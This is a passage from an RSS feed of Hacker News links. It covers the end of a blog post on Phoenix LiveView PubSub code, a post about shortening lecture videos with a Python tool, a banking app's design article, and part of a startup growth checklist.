<pre><code><span>Phoenix.PubSub</span><span>.</span><span>broadcast</span><span data-group-id="3903443770-1">(</span><span>
  </span><span>Bytepack.PubSub</span><span>,</span><span>
  </span><span>"user:</span><span data-group-id="3903443770-2">#{</span><span>user</span><span>.</span><span>id</span><span data-group-id="3903443770-2">}</span><span>:package:new"</span><span>,</span><span>
  </span><span data-group-id="3903443770-3">{</span><span>:published</span><span>,</span><span> </span><span>package</span><span>.</span><span>id</span><span data-group-id="3903443770-3">}</span><span>
</span><span data-group-id="3903443770-1">)</span></code></pre>
<p>
Back in <code>PackageLive.New</code>, we change <code>mount/3</code> to also subscribe to said topic:</p>
<pre><code><span>def</span><span> </span><span>mount</span><span data-group-id="1794271301-1">(</span><span>params</span><span>,</span><span> </span><span>session</span><span>,</span><span> </span><span>socket</span><span data-group-id="1794271301-1">)</span><span> </span><span data-group-id="1794271301-2">do</span><span>
  </span><span>socket</span><span> </span><span>=</span><span> </span><span>authenticate</span><span data-group-id="1794271301-3">(</span><span>socket</span><span>,</span><span> </span><span>session</span><span data-group-id="1794271301-3">)</span><span>

  </span><span>if</span><span> </span><span>connected?</span><span data-group-id="1794271301-4">(</span><span>socket</span><span data-group-id="1794271301-4">)</span><span> </span><span data-group-id="1794271301-5">do</span><span>
    </span><span>Phoenix.PubSub</span><span>.</span><span>subscribe</span><span data-group-id="1794271301-6">(</span><span>
      </span><span>Bytepack.PubSub</span><span>,</span><span>
      </span><span>"user:</span><span data-group-id="1794271301-7">#{</span><span>socket</span><span>.</span><span>assigns</span><span>.</span><span>current_user</span><span>.</span><span>id</span><span data-group-id="1794271301-7">}</span><span>:package:new"</span><span>
    </span><span data-group-id="1794271301-6">)</span><span>
  </span><span data-group-id="1794271301-5">end</span><span>

  </span><span data-group-id="1794271301-8">{</span><span>:noreply</span><span>,</span><span> </span><span>authenticate</span><span data-group-id="1794271301-9">(</span><span>socket</span><span>,</span><span> </span><span>session</span><span data-group-id="1794271301-9">)</span><span data-group-id="1794271301-8">}</span><span>
</span><span data-group-id="1794271301-2">end</span></code></pre>
<p>
and then write a clause to handle said events:</p>
<pre><code><span>def</span><span> </span><span>handle_info</span><span data-group-id="3117829849-1">(</span><span data-group-id="3117829849-2">{</span><span>:published</span><span>,</span><span> </span><span>package_id</span><span data-group-id="3117829849-2">}</span><span>,</span><span> </span><span>socket</span><span data-group-id="3117829849-1">)</span><span> </span><span data-group-id="3117829849-3">do</span><span>
  </span><span data-group-id="3117829849-4">{</span><span>:noreply</span><span>,</span><span> </span><span>live_redirect</span><span data-group-id="3117829849-5">(</span><span>socket</span><span>,</span><span> </span><span>to</span><span>:</span><span> </span><span>"/packages/</span><span data-group-id="3117829849-6">#{</span><span>package_id</span><span data-group-id="3117829849-6">}</span><span>"</span><span data-group-id="3117829849-5">)</span><span data-group-id="3117829849-4">}</span><span>
</span><span data-group-id="3117829849-3">end</span></code></pre>
<p>
And that’s it! Now we redirect the browser to the newly created package page whenever the package is published.</p>
<p>
    <img src="https://dashbit.co/images/posts/2020/bytepack-new-package.gif" alt="ytepack new package screen"><br></p>
<p>
We didn’t have to:</p>
<ul>
  <li>
manually establish WebSockets or long-polling connections  </li>
  <li>
create a separate endpoint to send requests to  </li>
  <li>
define a specific JSON payload between client/server  </li>
  <li>
write any front-end glue code  </li>
  <li>
setup third-party dependencies for pubsub, such as Redis, nor anything else to run at scale  </li>
  <li>
etc  </li>
</ul>
<p>
Compared to what <a href="https://phoenixphrenzy.com/">others have built with LiveView</a>, this is absolutely trivial. However, the fact we can set this up in less than 2 minutes is that excites me!</p>
<p>
LiveView comes with its own integrated testing story too. We can test everything from the comfort of Elixir, without a need to bring heavy-hitters such as Selenium or any webdriver.</p>
<p>
To run in development, we only need to start our Phoenix server. We don’t need external tooling in production either. We can deploy this to <a href="https://www.gigalixir.com/">Gigalixir</a>, <a href="https://gigalixir.readthedocs.io/en/latest/cluster.html">configure clustering</a>, and everything just works across multiple nodes.</p>
<p>
While this is a very limited sample of what LiveView can do, it highlights the beauty of its model and, perhaps more importantly, it shows all of the things we don’t have to manage nor worry about. At the end of the day, the Bytepack team can focus more on the user experience than we would otherwise, thanks to LiveView’s accessibility.</p>
  </article>
</div></div>]]>
            </description>
            <link>https://dashbit.co/blog/the-beauty-of-liveview</link>
            <guid isPermaLink="false">hacker-news-small-sites-24552363</guid>
            <pubDate>Tue, 22 Sep 2020 08:55:23 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Watching lecture videos faster using Python]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24552216">thread link</a>) | @ericdanielski
<br/>
September 22, 2020 | https://www.cmahn.de/2020/04/07/watching-lecture-videos-faster-using-python/ | <a href="https://web.archive.org/web/*/https://www.cmahn.de/2020/04/07/watching-lecture-videos-faster-using-python/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="page"><div><div><div><div><div><div id="post-230"><div><h2>Watching lecture videos faster using Python</h2><div> <p><img width="1024" height="645" src="https://i1.wp.com/www.cmahn.de/wp-content/uploads/2020/04/john-schnobrich-yFbyvpEGHFQ-unsplash-scaled.jpg?fit=1024%2C645&amp;ssl=1&amp;is-pending-load=1" alt="" data-lazy-srcset="https://i1.wp.com/www.cmahn.de/wp-content/uploads/2020/04/john-schnobrich-yFbyvpEGHFQ-unsplash-scaled.jpg?w=2560&amp;ssl=1 2560w, https://i1.wp.com/www.cmahn.de/wp-content/uploads/2020/04/john-schnobrich-yFbyvpEGHFQ-unsplash-scaled.jpg?resize=300%2C189&amp;ssl=1 300w, https://i1.wp.com/www.cmahn.de/wp-content/uploads/2020/04/john-schnobrich-yFbyvpEGHFQ-unsplash-scaled.jpg?resize=1024%2C645&amp;ssl=1 1024w, https://i1.wp.com/www.cmahn.de/wp-content/uploads/2020/04/john-schnobrich-yFbyvpEGHFQ-unsplash-scaled.jpg?resize=768%2C484&amp;ssl=1 768w, https://i1.wp.com/www.cmahn.de/wp-content/uploads/2020/04/john-schnobrich-yFbyvpEGHFQ-unsplash-scaled.jpg?resize=1536%2C968&amp;ssl=1 1536w, https://i1.wp.com/www.cmahn.de/wp-content/uploads/2020/04/john-schnobrich-yFbyvpEGHFQ-unsplash-scaled.jpg?resize=2048%2C1290&amp;ssl=1 2048w, https://i1.wp.com/www.cmahn.de/wp-content/uploads/2020/04/john-schnobrich-yFbyvpEGHFQ-unsplash-scaled.jpg?resize=1714%2C1080&amp;ssl=1 1714w" data-lazy-sizes="(max-width: 1024px) 100vw, 1024px" data-lazy-src="https://i1.wp.com/www.cmahn.de/wp-content/uploads/2020/04/john-schnobrich-yFbyvpEGHFQ-unsplash-scaled.jpg?fit=1024%2C645&amp;ssl=1&amp;is-pending-load=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></p><p>Dear Readers,</p><p>Due to the continuing restrictions caused by the Covid-19 virus, I learn from many students that universities are increasingly switching to digital teaching for the coming semester. In order to make the amount of lecture videos more bearable for you as a student, I would like to introduce you to a technical solution with which you can shorten the duration of the lecture videos.</p><h2><span id="How_the_algorithm_works"></span>How the algorithm works<span></span></h2><p>The following YouTube video explains in detail how this procedure works:</p><figure><p><span><iframe width="3840" height="2160" src="https://www.youtube.com/embed/DQ8orIurGxw?version=3&amp;rel=1&amp;fs=1&amp;autohide=2&amp;showsearch=0&amp;showinfo=1&amp;iv_load_policy=1&amp;wmode=transparent" allowfullscreen="true"></iframe></span></p><figcaption>„Automatic on-the-fly video editing tool!“ by carykh</figcaption></figure><h2><span id="Test_of_the_algorithm"></span>Test of the algorithm<span></span></h2><p>In order to test this algorithm, I downloaded an episode of the Tagesschau (a German daily news broadcast) and let the algorithm run on this video. I do not want to withhold the result from you. You can decide for yourself how well the algorithm works. Please note how compact the daily news broadcast is and how much of the video material could still be filtered out.</p><h3><span id="Tagesschau_from_the_2nd_of_April_2020_(optimized)"></span>Tagesschau from the 2nd of April 2020 (optimized)<span></span></h3><figure><p><span><iframe width="3840" height="2160" src="https://www.youtube.com/embed/Q9vGBE2LLsk?version=3&amp;rel=1&amp;fs=1&amp;autohide=2&amp;showsearch=0&amp;showinfo=1&amp;iv_load_policy=1&amp;wmode=transparent" allowfullscreen="true"></iframe></span></p></figure><h3><span id="Tagesschau_from_the_2nd_of_April_2020_(removed_video_footage)"></span>Tagesschau from the 2nd of April 2020 (removed video footage)<span></span></h3><figure><p><span><iframe width="3840" height="2160" src="https://www.youtube.com/embed/qxWKuDR3Kx8?version=3&amp;rel=1&amp;fs=1&amp;autohide=2&amp;showsearch=0&amp;showinfo=1&amp;iv_load_policy=1&amp;wmode=transparent" allowfullscreen="true"></iframe></span></p></figure><h2><span id="Download"></span>Download<span></span></h2><p><a href="https://github.com/carykh/jumpcutter" target="_blank" rel="noreferrer noopener">https://github.com/carykh/jumpcutter</a></p><h2><span id="Notice"></span>Notice<span></span></h2><p>The picture of this post is provided by <a href="https://unsplash.com/@johnschno?utm_source=unsplash&amp;utm_medium=referral&amp;utm_content=creditCopyText">John Schnobrich</a> on <a href="https://unsplash.com/s/photos/lecture-online?utm_source=unsplash&amp;utm_medium=referral&amp;utm_content=creditCopyText">Unsplash</a></p></div><p>Tags: <a href="https://www.cmahn.de/tag/corona/" rel="tag">Corona</a>, <a href="https://www.cmahn.de/tag/digital/" rel="tag">Digital</a>, <a href="https://www.cmahn.de/tag/e-learning/" rel="tag">e-learning</a>, <a href="https://www.cmahn.de/tag/efficient/" rel="tag">efficient</a>, <a href="https://www.cmahn.de/tag/faster/" rel="tag">faster</a>, <a href="https://www.cmahn.de/tag/learning/" rel="tag">learning</a>, <a href="https://www.cmahn.de/tag/online/" rel="tag">Online</a>, <a href="https://www.cmahn.de/tag/python/" rel="tag">Python</a>, <a href="https://www.cmahn.de/tag/save-time/" rel="tag">save time</a>, <a href="https://www.cmahn.de/tag/uni/" rel="tag">Uni</a>, <a href="https://www.cmahn.de/tag/university/" rel="tag">University</a>, <a href="https://www.cmahn.de/tag/video/" rel="tag">Video</a>, <a href="https://www.cmahn.de/tag/watching/" rel="tag">watching</a></p></div><nav role="navigation" aria-label="Beiträge"><h2>Beitrags-Navigation</h2></nav> <!-- /post-comments --></div></div></div></div></div></div></div></div>]]>
            </description>
            <link>https://www.cmahn.de/2020/04/07/watching-lecture-videos-faster-using-python/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24552216</guid>
            <pubDate>Tue, 22 Sep 2020 08:27:59 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Evolutionary Design of Up Banking]]>
            </title>
            <description>
<![CDATA[
Score 35 | Comments 14 (<a href="https://news.ycombinator.com/item?id=24552043">thread link</a>) | @merricksb
<br/>
September 22, 2020 | https://up.com.au/blog/the-evolutionary-design-of-up/ | <a href="https://web.archive.org/web/*/https://up.com.au/blog/the-evolutionary-design-of-up/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section><p>When we launched nearly 2 years ago, we declared our first principles approach to banking:</p>
<blockquote>
<p>“Challenge the assumptions and limitations in banking and re-evaluate them from a more current point of view."</p>
</blockquote>
<p>This statement did not come out of a contrived workshop, or committee, or a board of investors. It was the resonating sentiment of a team that had spent years in the weeds of banking software and its bureaucracy. Existing banks have too much baggage to be able to see the future of banking for what it could be. They lacked the courage to really re-invent themselves. Some questions that emerged from that period:</p>
<ul>
<li><em>Why doesn’t every transaction have a timestamp, a merchant logo?</em></li>
<li><em>Why are all my payments to a particular person not grouped?</em></li>
<li><em>Why isn’t it easier to pay someone I’ve paid before?</em></li>
<li><em>Why am I sitting on hold on my phone to resolve an issue?</em></li>
<li><em>How can saving money be fun and engaging?</em></li>
</ul>
<p>We knew that if we followed our noses and solved these user-centric problems, and many others of course, that winning customers would take care of itself. We now have over 280,000 Upsiders and counting.</p>
<h2>Making Feedback Easy</h2>
<p>Up does not do traditional user testing. There, I said it. That’s our dirty secret.</p>
<p>We think there are other techniques that are faster and better indicators of real-world behaviour. We also believe we have two advantages:</p>
<ul>
<li><strong>An innovation mindset</strong></li>
<li><strong>A deeper relationship with our customers than any financial institution in Australia</strong></li>
</ul>
<p>Much of banking is a known problem space. We feel like we're taking a more creative approach to the problem, but that's not to say we don't rely on user feedback. Our <em>Talk to Us</em> section encourages Upsiders to give us feedback or suggest ideas. To date, we have received over 6,000 ideas via this channel, making it one of the most crucial conduits into the minds of our customers. We also have other highly-engaged channels such as our socials and the newsletter where we hear, almost instantly, what customers think of what we’ve delivered.</p>
<figure>
  <img loading="lazy" src="https://up.com.au/449d9fa0873011802b194d6b669ffe9e/feedback-categories.gif" alt="Initiating a 'Talk to Us' chat with our team">
  <figcaption>
    Our <em>Talk to Us</em> trinity; ask for help, give feedback and report a bug
  </figcaption>
</figure>
<h2>Engagement Is the Name of the Game</h2>
<p>So where do we get our inspiration? It's rarely in the banking or fintech space. These are the apps that exist on billions of devices and set the bar for mobile digital experiences:</p>
<figure>
  <span>
      <a href="https://up.com.au/static/2e11befb2645e3c45227a91f56aed310/c6b2e/inspire_apps.jpg" target="_blank" rel="noopener">
    <span></span>
  <img alt="World leaders for designing mobile experiences" title="World leaders for designing mobile experiences" src="https://up.com.au/static/2e11befb2645e3c45227a91f56aed310/40619/inspire_apps.jpg" srcset="https://up.com.au/static/2e11befb2645e3c45227a91f56aed310/b0fd2/inspire_apps.jpg 175w,
https://up.com.au/static/2e11befb2645e3c45227a91f56aed310/aaaf9/inspire_apps.jpg 350w,
https://up.com.au/static/2e11befb2645e3c45227a91f56aed310/40619/inspire_apps.jpg 700w,
https://up.com.au/static/2e11befb2645e3c45227a91f56aed310/e8c9e/inspire_apps.jpg 1050w,
https://up.com.au/static/2e11befb2645e3c45227a91f56aed310/5814a/inspire_apps.jpg 1400w,
https://up.com.au/static/2e11befb2645e3c45227a91f56aed310/c6b2e/inspire_apps.jpg 2175w" sizes="(max-width: 700px) 100vw, 700px" loading="lazy">
  </a>
    </span>
  <figcaption>
    The leaders in mobile experience design
  </figcaption>
</figure>
<p>While they vary in purpose, their collective dominance in the landscape means they teach and familiarise patterns to expect when using our phones.</p>
<ul>
<li><em>How does TikTok allow you to react to content quickly and effortlessly?</em></li>
<li><em>What similarities are there between Whatsapp, Messenger and Instagram when conversing with friends?</em></li>
<li><em>When explaining new features what language do these platforms use? When do they use visualisations? When do they use words?</em></li>
<li><em>When is Snapchat playful and when is it serious?</em></li>
<li><em>Do I identify with my real name or username for Instagram? What about Facebook?</em></li>
</ul>
<p>As users we immerse ourselves in the apps that have nailed engagement. While acknowledging the patterns they establish, we also appreciate the balance between knowing when to follow them and when to do our own thing. Up has a handful of atypical patterns, but as long as they are usable and intuitive they can become distinct moments used to engage and delight.</p>
<p>Why is it so important that Upsiders engage with the Up app? Aside from the opportunity to nurture a relationship through frequent interactions, we also think that being more engaged with your money encourages better financial literacy. It’s common that people fall into credit trouble by continuing to use their plastic cards without checking their balance regularly. By making Up an engaging experience, we’re making Upsiders more confident and connected to their finances.</p>
<h2>Becoming an Upsider</h2>
<p>We’ve previously deep-dived on our <a href="https://up.com.au/blog/designing-a-super-powered-welcome-pack-experience/">card delivery experience</a>. Before we could even get that far, we had to solve the huge problem of enabling people to sign up for a bank account without leaving the comfort of a mobile app — something that had not been done before in Australia.</p>
<p>We knew that the sheer amount of information we needed from the user was going to be a challenge. Banking is highly regulated in Australia, so we had to cater for many types of identity data (passport, license etc). Most apps can get away with just asking for a username, email and password.</p>
<p>Mobile flows tend to be atomic with a single input per screen, so with identity verification we were anticipating quite a long flow. Our focus was to trim the fat wherever possible, not just by reducing the total number of screens but also by making it easy for people to understand what was being asked of them as they progressed.</p>
<figure>
  <span>
      <a href="https://up.com.au/static/e381b2e19148dfb3bd4e3475c1d71c01/c6b2e/signup-flow.jpg" target="_blank" rel="noopener">
    <span></span>
  <img alt="Large and complicated data capture flow" title="Large and complicated data capture flow" src="https://up.com.au/static/e381b2e19148dfb3bd4e3475c1d71c01/40619/signup-flow.jpg" srcset="https://up.com.au/static/e381b2e19148dfb3bd4e3475c1d71c01/b0fd2/signup-flow.jpg 175w,
https://up.com.au/static/e381b2e19148dfb3bd4e3475c1d71c01/aaaf9/signup-flow.jpg 350w,
https://up.com.au/static/e381b2e19148dfb3bd4e3475c1d71c01/40619/signup-flow.jpg 700w,
https://up.com.au/static/e381b2e19148dfb3bd4e3475c1d71c01/e8c9e/signup-flow.jpg 1050w,
https://up.com.au/static/e381b2e19148dfb3bd4e3475c1d71c01/5814a/signup-flow.jpg 1400w,
https://up.com.au/static/e381b2e19148dfb3bd4e3475c1d71c01/c6b2e/signup-flow.jpg 2175w" sizes="(max-width: 700px) 100vw, 700px" loading="lazy">
  </a>
    </span>
  <figcaption>
    A portion of the Sign-up flow
  </figcaption>
</figure>
<p>We fought to reduce the amount of data we needed to collect. Why does banking need to know your gender? We cut it. Do you need your card sent to a PO Box? We’ll give you a contextual experience based on answers you’ve already provided rather than a scrolling form full of fields. As we tested the new flow amongst ourselves and with beta users from our waitlist, we made a few changes:</p>
<ul>
<li>Anchoring buttons to the bottom of the viewport, and making them full-width. Close to your thumb and easy to hit.</li>
<li>Removing anything extra like images, so you could move faster without distractions.</li>
<li>Using conversational instructions (eg “What is your mobile number?” Instead of “Enter mobile number”). And only using secondary body text when it was really necessary.</li>
<li>Using example text for the input placeholder, so you'd know what the right info looks like.</li>
</ul>
<figure>
  <video autoplay="true" loop="true" muted="true" playsinline="true" alt="Signup flow, before and after">  
    <source type="video/mp4" src="https://up.com.au/85d89ef5fc1450db9c15cb25ceed64d1/signup-flow-tweaks.mp4">
  </video>
  <figcaption>    
    Tweaks made to the signup flow
  </figcaption>
</figure>
<p>All of these small iterations reduced the cognitive load for users and made it feel easy and fast, despite the number of screens. This granularity was important as there isn’t actually a single sign up flow, but several which vary depending on your circumstances and the information we are required to collect.</p>
<h2>Up Yeah!</h2>
<p>Once we became more confident in our onboarding flow and how streamlined it was becoming, you could feel the team were ready to ship it and move onto the next bit of work.</p>
<p>It’s easy to have the blinkers on when you have such a measurable and objective goal — get users into the app in under x time — but stepping back, we made the observation that although we’d nailed sign up speed, something was missing the first time you landed on your activity feed. A moment that should feel significant and celebratory — you’ve literally just opened a bank account in under 3 minutes through your phone — feels clinical and unimpressive. We appreciate great brand moments in digital experiences, most notably MailChimp’s use of emotive design throughout their email software.</p>
<figure>
  <img loading="lazy" src="https://up.com.au/b5b11a8931d184e937662bc553657582/mailchimp.gif" alt="Mailchimp animations">
  <figcaption>  
    Great emotive design through animations by MailChimp
  </figcaption>
</figure>
<p>Email campaigns are stressful exercises — you can’t unsend them once they go out. It’s the nature of the beast. Interestingly, it was the arm of their mascot beast Freddie that was used in these cute but situationally-aware animations. The red button before launch, the high five once your campaign is live, and the rock fist for scheduled campaigns.</p>
<p>Our creative director Pete was eager to create a moment post-signup that made you go “f*ck yeah” in celebration.</p>
<figure>
  <img loading="lazy" src="https://up.com.au/1c642ec78c4396636c3b1bc150d48a29/upyeahmoment-signup.gif" alt="Up Yeah! account created">
  <figcaption>  
    The first of many ‘Up Yeah!’ moments
  </figcaption>
</figure>
<p>Almost immediately after this launched it was being shared by new Upsiders and acknowledged through our feedback channels. Of course you only give yourself an opportunity for these moments if you are nailing the fundamentals. But this reinforcement encouraged us to lean into these seemingly frivolous treatments as a way to delight Upsiders while building a stronger brand.</p>
<h2>Logging in Sucks</h2>
<p>Sometimes the design process involves considering what you don’t see as much as what you do see. For Up, removing the login screen is a great example of this. Banking apps tend to have heavy authentication flows before you see your feed or landing screen. It’s easy to see how this came to be; mobile apps came after desktop banking sites, and so inherited their secure lockdown context. And perhaps it goes back even further back to the mindset of “money belongs in a vault, behind a locked door”.</p>
<p>With all the technological advances in mobile device security, from the humble PIN code to sophisticated biometric recognition, it’s worth questioning some of the assumptions and trade-offs made in the name of security.</p>
<blockquote>
<p>Logging in is a big friction point. Especially if we’re trying to help inform you about your finances.</p>
</blockquote>
<p>There’s an interesting distinction that’s prominent in tech — the difference between security and privacy. If we break out of the world of banking apps and look at some of the apps we use each and every day – imagine if you had to enter a passcode every time you opened your email, or your messages? Yet if someone had access to either, they could reset every password you have and really cause you some headaches. We found a helpful albeit simplified distinction when approaching this aspect of the user-experience:</p>
<br>
<table>
    <tbody><tr>
        <td><img loading="lazy" src="https://up.com.au/251bbe56c807fe4657239958a04f14e6/zap-coat.gif" alt="Mailchimp animations">
        </td>
        <td>
          <h3>Privacy</h3>
          Protecting information that is sensitive
          <em> "Read Only"</em>
        </td>
    </tr>
</tbody></table>
<table>
    <tbody><tr>
        <td><img loading="lazy" src="https://up.com.au/6e9f440aae0b397bd198cc1182838ed9/zap-lock.gif" alt="Mailchimp animations">
        </td>
        <td>
          <h3>Security</h3>
          Protecting against being compromised financially
          <em>"Write Access"</em>
        </td>
    </tr>
</tbody></table>

<p>A design decision we’ve made with this framework is removing the need to enter a passcode by default (which can be re-enabled in settings), and also when moving money where there isn’t any risk. Transfering between Savers doesn’t require you to use your phone’s authentication flow (e.g. passcode, Apple’s FaceID or Android’s BioAuth), but moving money into your spending account or sending money outside of your account (e.g. to another bank or via BPay) does.</p>
<p>Our philosophy is to ask for authentication where appropriate to maximise security, while also letting Upsiders enjoy the benefits of being more informed and connected with their money in a low-friction way.  Our push …</p></section></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://up.com.au/blog/the-evolutionary-design-of-up/">https://up.com.au/blog/the-evolutionary-design-of-up/</a></em></p>]]>
            </description>
            <link>https://up.com.au/blog/the-evolutionary-design-of-up/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24552043</guid>
            <pubDate>Tue, 22 Sep 2020 07:59:38 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: 168 Point epic checklist for validating and growing your startup]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24551473">thread link</a>) | @veebuv
<br/>
September 21, 2020 | https://www.remoteworkly.co/the-ultimate-startup-checklist | <a href="https://web.archive.org/web/*/https://www.remoteworkly.co/the-ultimate-startup-checklist">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-w-tab="Tab 4"><div><div role="list"><div role="listitem"><div><div><p>Thank you! Your submission has been received!</p></div><div><p>Oops! Something went wrong while submitting the form.</p></div></div><div><p>No point building an app without seeing where customers are experiencing pain. Make it extremely easy for customers to get in touch with you. Build a relationship with them</p></div></div><div role="listitem"><div><div><p>Thank you! Your submission has been received!</p></div><div><p>Oops! Something went wrong while submitting the form.</p></div></div><div><p>Launch multiple times here and don't be spamming. ShowHN works well sometimes. If you rank in the top page of HN you're looking at atleast 30-40k hits in a day</p></div></div><div role="listitem"><div><div><p>Thank you! Your submission has been received!</p></div><div><p>Oops! Something went wrong while submitting the form.</p></div></div><div><p>Drive scarcity in referrals, give the first 100 users on launch day a certain discount for sharing your app</p></div></div><div role="listitem"><div><div><p>Thank you! Your submission has been received!</p></div><div><p>Oops! Something went wrong while submitting the form.</p></div></div><div><p>People love success stories. Share your journey on Twitter or Linkedin etc. It becomes an incredible compounding cycle as you share more stories you acquire more customers and rinse and repeat</p></div></div><div role="listitem"><div><div><p>Thank you! Your submission has been received!</p></div><div><p>Oops! Something went wrong while submitting the form.</p></div></div><div><p>A robots. txt file tells search engine crawlers which pages or files the crawler can or can't request from your site. This is used mainly to avoid overloading your site with requests; it is not a mechanism for keeping a web page out of Google.</p></div></div><div role="listitem"><div><div><p>Thank you! Your submission has been received!</p></div><div><p>Oops! Something went wrong while submitting the form.</p></div></div><div><p>51.53% of traffic these days is mobile, optimise your website for mobile traffic and page load speed</p></div></div><div role="listitem"><div><div><p>Thank you! Your submission has been received!</p></div><div><p>Oops! Something went wrong while submitting the form.</p></div></div><div><p>If you're product targets multiple personas, ensure you have persona specific pages - this helps boost conversion. This also gives you a chance to real nail down specific pains a user faces</p></div></div><div role="listitem"><div><div><p>Thank you! Your submission has been received!</p></div><div><p>Oops! Something went wrong while submitting the form.</p></div></div><div><p>Great customer experience goes a REALLY long way. Use chatbots, customer calls or emails to build dialog and make sure they are happy with the app</p></div></div><div role="listitem"><div><div><p>Thank you! Your submission has been received!</p></div><div><p>Oops! Something went wrong while submitting the form.</p></div></div><div><p>Commitment is the best form of validation. Set up pre-order pages to get customers to buy heavy discounted versions of your product</p></div></div><div role="listitem"><div><div><p>Thank you! Your submission has been received!</p></div><div><p>Oops! Something went wrong while submitting the form.</p></div></div><div><p>People buy from people who they trust (refer to word of mouth) - sell your product via influencers and you'll automatically get validation and a huge reach. Circle.so did this with Sahil Lavingya and the founder mentioned their first 100 or 1000 customers came just from one tweet</p></div></div><div role="listitem"><div><div><p>Thank you! Your submission has been received!</p></div><div><p>Oops! Something went wrong while submitting the form.</p></div></div><div><p>Create different onboarding flows specific to the persona of the customer onboarding</p></div></div><div role="listitem"><div><div><p>Thank you! Your submission has been received!</p></div><div><p>Oops! Something went wrong while submitting the form.</p></div></div><div><p>Have a lawyer write down your privacy policy that covers your data handling. Or use a tool like Iubenda</p></div></div><div role="listitem"><div><div><p>Thank you! Your submission has been received!</p></div><div><p>Oops! Something went wrong while submitting the form.</p></div></div><div><p>80% of the job is in the subject line, build your subject line then your content. Make sure you don't look like an ad, you need to sound like a friend so they open it. Get to the point and offer immediate value</p></div></div><div role="listitem"><div><div><p>Thank you! Your submission has been received!</p></div><div><p>Oops! Something went wrong while submitting the form.</p></div></div><div><p>If you're comfortable, share a demo about how your product works. A video will really help people understand what you're exactly about and they'll get to see the app in use vs just conceptual words.</p></div></div><div role="listitem"><div><div><p>Thank you! Your submission has been received!</p></div><div><p>Oops! Something went wrong while submitting the form.</p></div></div><div><p>The FB pixel will help with retargeting users based on their interaction with your app to re-engage with them or find people similar to your best users</p></div></div><div role="listitem"><div><div><p>Thank you! Your submission has been received!</p></div><div><p>Oops! Something went wrong while submitting the form.</p></div></div><div><p>Share your app with all your mates, friends and family</p></div></div><div role="listitem"><div><div><p>Thank you! Your submission has been received!</p></div><div><p>Oops! Something went wrong while submitting the form.</p></div></div><div><p>You need to be active on all the feedback websites. Personally respond to every good and bad comment, they need to know you're a human and they need to fall in love with your story</p></div></div><div role="listitem"><div><div><p>Thank you! Your submission has been received!</p></div><div><p>Oops! Something went wrong while submitting the form.</p></div></div><div><p>Knowing where users search for solutions will help you optimise your advertising spend</p></div></div><div role="listitem"><div><div><p>Thank you! Your submission has been received!</p></div><div><p>Oops! Something went wrong while submitting the form.</p></div></div><div><p>This is picking up these days where people are sharing interactive blogs via checklists (lol) or slidebars to improve the time people spend on a page, indicating value to google</p></div></div><div role="listitem"><div><div><p>Thank you! Your submission has been received!</p></div><div><p>Oops! Something went wrong while submitting the form.</p></div></div><div><p>Track all your customer support tickets without losing sight of whats important</p></div></div><div role="listitem"><div><div><p>Thank you! Your submission has been received!</p></div><div><p>Oops! Something went wrong while submitting the form.</p></div></div><div><p>Don't let everyone access your app in the early days. Resistive onboarding is good, it means only people who really want your product have access to it. So your early group are high intent users. Also this gives you a chance to set up a call with the customer and demo the product, more importantly understand the pain points they're facing and looking to have solved</p></div></div><div role="listitem"><div><div><p>Thank you! Your submission has been received!</p></div><div><p>Oops! Something went wrong while submitting the form.</p></div></div><div><p>Run a small campaign across social media networks to get some warm traffic to your launch</p></div></div><div role="listitem"><div><div><p>Thank you! Your submission has been received!</p></div><div><p>Oops! Something went wrong while submitting the form.</p></div></div><div><p>Offer a very friendly cancellation and refund policy</p></div></div><div role="listitem"><div><div><p>Thank you! Your submission has been received!</p></div><div><p>Oops! Something went wrong while submitting the form.</p></div></div><div><p>A sitemap is a file where you provide information about the pages, videos, and other files on your site, and the relationships between them.</p></div></div><div role="listitem"><div><div><p>Thank you! Your submission has been received!</p></div><div><p>Oops! Something went wrong while submitting the form.</p></div></div><div><p>Make communicating with your customer easy. Integrate your Drift and Slack so whenever a customer messages you can respond to them directly from slack</p></div></div><div role="listitem"><div><div><p>Thank you! Your submission has been received!</p></div><div><p>Oops! Something went wrong while submitting the form.</p></div></div><div><p>Ensure your app is secure, environment variables are locked, admin passwords are secure. Ensure there's no backdoors open to your AWS/Cloud service provider. Hash your customer passwords</p></div></div><div role="listitem"><div><div><p>Thank you! Your submission has been received!</p></div><div><p>Oops! Something went wrong while submitting the form.</p></div></div><div><p>- CPM | Cost per 1000 impressions (what you pay to Facebook)
- CTR | Click-through rate. What’s the percentage of people clicking on your ad?</p></div></div><div role="listitem"><div><div><p>Thank you! Your submission has been received!</p></div><div><p>Oops! Something went wrong while submitting the form.</p></div></div><div><p>Hotjar makes it feel like you're looking at the user actually use the app, without revealing sensitive data and Sentry helps with error logging. This setup will prevent you from asking the user for "steps to recreate bug"</p></div></div><div role="listitem"><div><div><p>Thank you! Your submission has been received!</p></div><div><p>Oops! Something went wrong while submitting the form.</p></div></div><div><p>Build out your homepage with your main value proposition, outcome based features and share the story about the product and how it will make your users life better and make them achieve what they want</p></div></div><div role="listitem"><div><div><p>Thank you! Your submission has been received!</p></div><div><p>Oops! Something went wrong while submitting the form.</p></div></div><div><p>The FAQ page is the sales objection page. During the validation period, find out every reason why someone would not use this app, and the questions they asked you. These are objections, resolve those</p></div></div><div role="listitem"><div><div><p>Thank you! Your submission has been received!</p></div><div><p>Oops! Something went wrong while submitting the form.</p></div></div><div><p>You don't need to test everything, i.e unit tests, you can perform e2e tests to a certain safety factor</p></div></div><div role="listitem"><div><div><p>Thank you! Your submission has been received!</p></div><div><p>Oops! Something went wrong while submitting the form.</p></div></div><div><p>Are customers problem aware and solution aware ? Are they aware of products solving for the problem ? This will help you understand where your customers 